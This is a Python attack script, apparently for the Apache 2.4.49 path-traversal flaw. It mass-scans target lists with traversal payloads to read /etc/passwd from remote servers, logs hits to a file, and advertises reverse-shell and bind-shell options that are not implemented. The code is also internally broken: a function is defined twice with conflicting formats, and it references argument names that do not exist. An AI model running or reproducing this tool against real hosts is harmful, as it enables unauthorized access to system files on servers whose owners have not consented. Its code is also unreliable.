import requests
import sys
import signal
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import csv
import os
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Graceful shutdown flag
shutdown_flag = False

# Signal handler for graceful shutdown
def signal_handler(sig, frame):
    global shutdown_flag
    print("\nGracefully shutting down...")
    shutdown_flag = True

signal.signal(signal.SIGINT, signal_handler)

# Load targets from CSV or TXT
def load_targets(file_path, csv_method=0):
    targets = []  # Initialize targets list
    if file_path.endswith('.csv'):
        try:
            with open(file_path, 'r') as file:
                csv_reader = csv.reader(file)
                for line in csv_reader:
                    if csv_method == 0:
                        # Method 0: Only take the part before the comma
                        raw_target = line[0].strip().split(',')[0]
                        if raw_target.startswith("http://") or raw_target.startswith("https://"):
                            targets.append((None, raw_target))
                        else:
                            protocol = default_protocols[0]  # Use the first protocol in the list
                            targets.append((None, f"{protocol}{raw_target}"))
                    elif csv_method == 1:
                        # Method 1: Split by commas and process each part as a separate target
                        for raw_target in line[0].strip().split(','):
                            raw_target = raw_target.strip().replace("\u200B", "")  # Strip spaces and remove zero-width space
                            if raw_target.startswith("http://") or raw_target.startswith("https://"):
                                targets.append((None, raw_target))
                            else:
                                protocol = default_protocols[0]
                                targets.append((protocol,raw_target))
        except Exception as e:
            print(f"Error reading CSV targets file: {e}")
            sys.exit(1)
    elif file_path.endswith('.txt'):
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    raw_target = line.strip()
                    if raw_target.startswith("http://") or raw_target.startswith("https://"):
                        targets.append((None, raw_target))
                    else:
                        protocol = default_protocols[0]
                        targets.append((default_protocols, raw_target))
        except Exception as e:
            print(f"Error reading TXT targets file: {e}")
            sys.exit(1)
    else:
        # If it's not a file path, assume it's a single target (URL)
        targets.append((default_protocols[0], file_path))  # Add the URL to targets

    return targets
# Argument parsing
parser = argparse.ArgumentParser(description="Apache 2.4.49 exploitable program (cgi-bin module exploitation) and generalized path traversal spider.")
parser.add_argument("target", help="single url or txt or csv file with targets.")
parser.add_argument("action", choices=["passwd", "reverse_shell", "bind_shell"], help="method of exploitation, action or endpoint.")
parser.add_argument("--protocol", choices=["http", "https"], default=None, help="Protocols ; Default is both, first HTTP, then HTTPS. If protocol is a inurl, ignores that, and this.")
parser.add_argument("--MULTITHREADS", type=int, choices=[0, 1], default=1, help="Default 1 ; multi-threading off (0), or on (1).")
parser.add_argument("--mthreads", type=int, default=8, help="Default 8 ; mutli-threading count or used threads amount.")
parser.add_argument("--hangtime", type=float, default=3, help="Default 3 ; seconds. Maximum wait per attempt on targets.")
parser.add_argument("--timeouts", type=int, default=4, help="Default 4 ; seconds. Connection timeout limit of attempt.")
parser.add_argument("--errorout", action="store_true", help="Display connection returns that result in errors (Messy, cause of long error message from the code).")
parser.add_argument("-pos", "--pause_on_success", action="store_true", help="^ pauses after each successful attempt on target.")
parser.add_argument("-sos", "--saves_on_success", action="store_true", help="^ save successful exploits by url to success.txt.")
parser.add_argument("-cgi", "--preloads_cgi_bin", action="store_true", help="^ add /cgi-bin before a payload. Doesn't without.")
parser.add_argument("-200", "--prints_on_200_ok", action="store_true", help="^ print 200 OK responses even if not passwd file.")
parser.add_argument("-red", "--redirects_200_ok", action="store_true", help="^ print all urls on 200 OK that then redirects to a seperate url path.")
parser.add_argument("-csv", "--csv_method", choices=[0, 1], type=int, default=0, help="^ parse the csv one address per line (ignore commas) or comma seqence.")
args = parser.parse_args()

# Determine protocol(s) to use
default_protocols = [f"{args.protocol}://"] if args.protocol else ["http://", "https://"]

# Load targets from file or as a single URL
targets = load_targets(args.target, csv_method=args.csv_method)  # Now passing the method flag

# Handle multithreading
use_multithreading = bool(args.MULTITHREADS)
max_threads = args.mthreads

# Load payloads
def load_payloads(payloads_file):
    payloads = []
    try:
        with open(payloads_file, 'r') as file:
            csv_reader = csv.reader(file)
            for row in csv_reader:
                if row:  # Skip empty rows
                    # Strip quotes from the payload
                    payload = row[0].strip().replace('"', '')
                    payloads.append(payload)
        return payloads
    except Exception as e:
        print(f"Error reading payloads file: {e}")
        sys.exit(1)

# Load the payloads
payloads = load_payloads("payloads.csv")

prepoints = ["/cgi-bin", ""]
# List of endpoints
endpoints = [
    "", "/admin/exec.php", "/exec", "/test.cgi", "/bash", "/status", 
    "/shell", "/admin/cmd", "/debug/exec", "/php/exec.php", "/bin/exec", 
    "/vulnerable.php", "/command.php", "/scripts/exec"
]

# Rest of your code...
# Load targets from CSV or TXT
def load_targets(file_path, csv_method=0):
    targets = []  # Initialize targets list
    print(f"Loading targets from {file_path}")

    if file_path.endswith('.csv'):
        try:
            with open(file_path, 'r') as file:
                csv_reader = csv.reader(file)
                for line in csv_reader:
                    print(f"Processing line: {line}")  # Debugging line
                    if line:  # Ensure there is content in the line
                        if csv_method == 0:
                            # Method 0: Only take the part before the comma
                            raw_target = line[0].strip().split(',')[0]
                            print(f"Using method 0, raw_target: {raw_target}")  # Debugging
                            # Clean up hidden characters (e.g., zero-width space)
                            raw_target = raw_target.replace("\u200B", "").strip()
                            # Check if the target already starts with a protocol
                            if raw_target.startswith("http://") or raw_target.startswith("https://"):
                                targets.append((raw_target,))  # Only add the target without additional protocol
                            else:
                                protocol = default_protocols[0]  # Use the first protocol in the list
                                targets.append((f"{protocol}{raw_target}",))

                        elif csv_method == 1:
                            # Method 1: Split by commas and process each part as a separate target
                            for raw_target in line:
                                raw_target = raw_target.strip()
                                print(f"Using method 1, raw_target: {raw_target}")  # Debugging
                                # Clean up hidden characters (e.g., zero-width space)
                                raw_target = raw_target.replace("\u200B", "").strip()
                                # Check if the target already starts with a protocol
                                if raw_target.startswith("http://") or raw_target.startswith("https://"):
                                    targets.append((raw_target,))  # Only add the target without additional protocol
                                else:
                                    protocol = default_protocols[0]
                                    targets.append((f"{protocol}{raw_target}",))  # Add full URL
        except Exception as e:
            print(f"Error reading CSV targets file: {e}")
            sys.exit(1)
    elif file_path.endswith('.txt'):
        try:
            with open(file_path, 'r') as file:
                for line in file:
                    raw_target = line.strip()
                    # Clean up hidden characters (e.g., zero-width space)
                    raw_target = raw_target.replace("\u200B", "").strip()
                    # Check if the target already starts with a protocol
                    if raw_target.startswith("http://") or raw_target.startswith("https://"):
                        targets.append((raw_target,))  # Only add the target without additional protocol
                    else:
                        protocol = default_protocols[0]
                        targets.append((f"{protocol}{raw_target}",))  # Add full URL
        except Exception as e:
            print(f"Error reading TXT targets file: {e}")
            sys.exit(1)
    else:
        # If it's not a file path, assume it's a single target (URL)
        raw_target = file_path.strip()
        # Clean up hidden characters (e.g., zero-width space)
        raw_target = raw_target.replace("\u200B", "").strip()
        # Check if the URL already starts with a protocol
        if raw_target.startswith("http://") or raw_target.startswith("https://"):
            targets.append((raw_target,))  # Only add the target without additional protocol
        else:
            protocol = default_protocols[0]
            targets.append((f"{protocol}{raw_target}",))  # Add full URL

    print(f"Loaded targets: {targets}")  # Debugging
    return targets

# Print with color
def print_colored(message, status_code):
    if status_code == 200:
        print(Fore.GREEN + message)
    elif status_code in [400, 404]:
        print(Fore.RED + message)
    else:
        print(Fore.WHITE + message)

def attempt_passwd_access(protocol, target, payload, timeout_count):
    if shutdown_flag:
        return False
    prepoint = "/cgi-bin" if args.use_cgi else ""
    # Ensure the target does not start with a protocol before adding it
    if not target.startswith("http://") and not target.startswith("https://"):
        url = f"{protocol}{target.strip()}{prepoint}{payload}/etc/passwd"
    else:
        url = f"{target}{prepoint}{payload}/etc/passwd"

    try:
#        print(f"Attempting access for: {url}")  # Debugging line
        response = requests.get(url, verify=False, timeout=args.hangtime, allow_redirects=True)  # Allow redirects
        status = response.status_code  # Capture HTTP status code

        # Check for successful access to passwd file
        if status == 200 and "root:x" in response.text:  # Simple check for passwd file content
            print(f"[SUCCESS] Status: {status}, Target: {target}, Payload: {url}")
            print(f"Response from {url}:\n{response.text}")
            if args.saves_on_success:
                save_success(target, url)
            if args.pause_on_success:
                input("Press Enter to continue...")
            return {"target": target, "status": status, "payload": url, "result": "SUCCESS"}

        elif status == 200 and args.print_on_200:
            print(f"[200 OK] Status: {status}, Target: {target}, Payload: {url}")
            print(f"Response from {url}:\n{response.text}")
            return {"target": target, "status": status, "payload": url, "result": "200 OK"}

        elif status in [301, 302, 303, 307, 308]:  # Redirects
            location = response.headers.get('Location', 'Unknown')
            if args.print_onredirects:
                print(f"[REDIRECT] Status: {status}, Target: {target}, Location: {location}, Payload: {url}")
            return {"target": target, "status": status, "payload": url, "result": "REDIRECT", "location": location}

        else:
            print(f"[FAIL] Status: {status}, Target: {target}, Payload: {url}")
            return {"target": target, "status": status, "payload": url, "result": "FAIL"}

    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] Status: Timeout, Target: {target}, Payload: {url}")
        timeout_count[target] += 1
        return {"target": target, "status": "Timeout", "payload": url, "result": "TIMEOUT"}

    except requests.exceptions.RequestException as e:
        if args.DISPLAYERRORCODE:  # Only print if --display_error is set
            print(f"[ERROR] Status: Error, Target: {target}, Payload: {url}, Error: {e}")
        return {"target": target, "status": "Error", "payload": url, "result": "ERROR", "error": str(e)}

# Print all responses with colors
def save_success(target, payload):
    with open("success.txt", "a") as file:
        file.write(f"Target: {target}, Payload: {payload}\n")

# Example of command line execution
# python3 script.py http://example.com passwd --print_on_200 --print_redirects

def passwd_access(target, protocols):
    timeout_count = {target: 0}
    # Ensure that protocols is a list, in case None is passed
    if not isinstance(protocols, list):
        protocols = [protocols]

    for protocol in protocols:
        if protocol is None:
            protocol = default_protocols[0]  # Ensure it's set to a default if None
        for payload in payloads:
            if shutdown_flag or timeout_count[target] >= args.targettimeout:
                print(f"[SKIPPING] Target {target} due to timeouts.")
                return
            attempt_passwd_access(protocol, target, payload, timeout_count)


def passwd_access_threaded():
    if not targets:
        print("No targets found.")
        return

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(passwd_access, target, protocols): target for protocols, target in targets}
        for future in as_completed(futures):
            if shutdown_flag:
                break


def passwd_access_single_thread():
    for protocols, target in targets:
        if shutdown_flag:
            return
        passwd_access(target, protocols)

if args.action == "passwd":
    if args.MULTITHREADS:
        passwd_access_threaded()
    else:
        passwd_access_single_thread()

print("Script finished.")
